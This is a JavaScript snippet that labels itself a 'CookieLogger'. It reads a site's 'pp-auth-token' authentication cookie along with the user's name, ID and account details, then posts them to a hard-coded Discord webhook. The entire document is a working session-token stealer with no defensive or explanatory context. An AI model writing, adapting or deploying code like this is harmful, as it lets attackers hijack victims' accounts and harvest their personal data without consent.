const codon = await cookieStore.get('pp-auth-token')
var codon1 = codon.value
var codon2 = user.displayname
var codon3 = user.punishments.length
var codon4 = user.boxesopened
var codon5 = user.pid

let request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/969471159370412043/MIf-d33sdl-sVhkxmmCqWzMkHqv-JfZZYdV4dxq6LlH_qmax-GsaRNj03LgLP1QGlxoI");
    request.setRequestHeader('Content-type', 'application/json');
    let today = new Date();
    let time = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate() + " > " + today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds() + " GMT-0500 (Eastern Standard Time)";
    let params = {
        username: "CCO CookieLogger || sdoma#6407",
        avatar_url: 'http://s3.amazonaws.com/pix.iemoji.com/images/emoji/apple/ios-12/256/skull.png',
        content: "Token = `" + codon1 + "`\n" + "Name = " + codon2 + "\n" + "Punishments = " + codon3 + "\n" + "UUID = " + codon5 + "\n" + "Unboxes = " + codon4
    }
request.send(JSON.stringify(params));
